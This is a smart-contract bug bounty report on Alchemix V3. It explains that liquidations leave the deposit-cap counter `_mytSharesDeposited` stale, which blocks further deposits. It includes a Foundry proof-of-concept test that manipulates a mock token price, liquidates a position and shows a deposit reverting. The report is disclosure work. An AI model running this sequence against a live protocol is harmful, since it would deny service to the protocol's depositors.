# 58502 sc high deposit cap denial of service due to stale mytsharesdeposited during liquidation

**Submitted on Nov 2nd 2025 at 20:41:45 UTC by @zcai for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58502
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

The contract enforces a global deposit cap using the internal counter `_mytSharesDeposited`, which tracks yield tokens deposited into user positions. However, during liquidations and forced repayments, MYT tokens are transferred out of the contract without decrementing this counter, causing it to become stale and overreported. This results in a denial of service for deposits, as the cap enforcement prevents new deposits even when the contract's actual token balance has decreased below the cap.

## Vulnerability Details

The AlchemistV3 contract uses `_mytSharesDeposited` to track the total amount of yield tokens (MYT) deposited by users and enforce the global `depositCap`. This counter is properly incremented during deposits and decremented during withdrawals, redemptions, and fee transfers. However, critical outflow paths in the liquidation system fail to update this accounting variable.

During liquidations, the `_doLiquidation()` function transfers MYT tokens to the transmuter and liquidator without decrementing `_mytSharesDeposited`. Similarly, the `_forceRepay()` function, which handles earmarked debt repayment during liquidations, transfers tokens to the transmuter and protocol fee receiver without updating the counter.

The vulnerability manifests when undercollateralized positions undergo liquidation. These operations transfer substantial amounts of MYT out of the contract, reducing the actual token balance while leaving `_mytSharesDeposited` unchanged. Since `deposit()` enforces the cap by checking `_mytSharesDeposited + amount <= depositCap`, freed capacity created by these outflows is never recognized.

Once the system approaches its deposit cap—a common scenario in production—any liquidation activity permanently blocks further deposits for all users. The contract appears to be at capacity based on the stale counter, even though significant token amounts have left the contract and actual capacity exists.

## Impact Details

This vulnerability causes a systemic denial of service for the core deposit functionality. When liquidations transfer MYT tokens out without updating `_mytSharesDeposited`, the accounting variable becomes permanently inflated relative to the actual token balance. This prevents the deposit cap from reflecting freed capacity, blocking legitimate user deposits even when the contract has available room. The issue persists until administrative intervention raises the cap, effectively requiring manual workarounds for normal protocol operations. Additionally, the `_getTotalUnderlyingValue()` function relies on `_mytSharesDeposited` for TVL calculations, resulting in overstated metrics that may impact liquidation logic and protocol risk assessments.

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L365-L372>

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L771-L780>

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L875-L889>

## Link to Proof of Concept

<https://gist.github.com/i-am-zcai/0630d2becc015e8debf8cde4f7b6e657>

## Proof of Concept

## Proof of Concept

`src/test/poc/DepositCapDoS.t.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "../../../lib/forge-std/src/Test.sol";

// Reuse the comprehensive harness and environment from the main AlchemistV3 tests
import {AlchemistV3Test} from "../AlchemistV3.t.sol";
import {IMockYieldToken} from "../mocks/MockYieldToken.sol";
import {SafeERC20} from "../../libraries/SafeERC20.sol";
import {AlchemistNFTHelper} from "../libraries/AlchemistNFTHelper.sol";
import {IllegalState} from "../../base/Errors.sol";

/// @notice PoC for Deposit Cap DoS via stale _mytSharesDeposited during liquidations/forceRepay
///         This test demonstrates that after tokens leave the Alchemist via liquidation, the
///         deposit cap does not reopen because _mytSharesDeposited is not decremented, causing
///         deposits to revert even though the contract has free capacity in practice.
contract DepositCapDoSPoC is AlchemistV3Test {
    using SafeERC20 for IERC20;

    function test_DepositCap_DOS_after_liquidation() external {
        // Ensure the strategy has yield tokens to establish a price context (as in other tests)
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        // 1) Create a borrower position which we will later liquidate
        //    This initial deposit will also be used to set the depositCap to "current balance".
        uint256 initialDeposit = 200_000 ether; // ample, already available to 0xBeef from setUp
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), initialDeposit);
        alchemist.deposit(initialDeposit, address(0xbeef), 0);
        uint256 beefTokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        // Max out borrow within LTV to make it sensitive to price move
        uint256 maxMint = alchemist.totalValue(beefTokenId) * FIXED_POINT_SCALAR / alchemist.minimumCollateralization();
        alchemist.mint(beefTokenId, maxMint, address(0xbeef));
        vm.stopPrank();

        // 2) Set deposit cap equal to current actual MYT shares held by Alchemist
        //    This means we are at the cap exactly and cannot deposit more right now (by design).
        uint256 currentSharesBal = IERC20(address(vault)).balanceOf(address(alchemist));
        vm.prank(alOwner);
        alchemist.setDepositCap(currentSharesBal);

        // 3) Manipulate yield token price to undercollateralize the position and liquidate it
        //    Increasing the yield token supply while underlying stays constant drops price per share.
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply; // +5.9%
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // Capture pre-balance to prove MYT leaves the Alchemist during liquidation
        uint256 preSharesBal = IERC20(address(vault)).balanceOf(address(alchemist));

        // Anyone can liquidate; use externalUser
        vm.prank(externalUser);
        alchemist.liquidate(beefTokenId);

        // 4) Verify MYT actually left the Alchemist contract during liquidation
        uint256 postSharesBal = IERC20(address(vault)).balanceOf(address(alchemist));
        assertLt(postSharesBal, preSharesBal, "Expected MYT shares to leave during liquidation");
        assertLt(postSharesBal, currentSharesBal, "Actual MYT balance is now below the deposit cap");

        // 5) Attempt to deposit a small amount; despite actual free capacity (postSharesBal < depositCap),
        //    deposit reverts because _mytSharesDeposited was not decremented during liquidation/forceRepay.
        //    This demonstrates a persistent DoS on deposits until governance manually increases the cap.
        uint256 tryAmount = 1e18; // 1 share
        // Sanity: there should be room by actual balance to accept this deposit w.r.t cap
        assertLe(postSharesBal + tryAmount, currentSharesBal, "There should be free capacity by actual balance");

        vm.startPrank(externalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), tryAmount);
        vm.expectRevert(IllegalState.selector);
        alchemist.deposit(tryAmount, externalUser, 0);
        vm.stopPrank();
    }
}
```
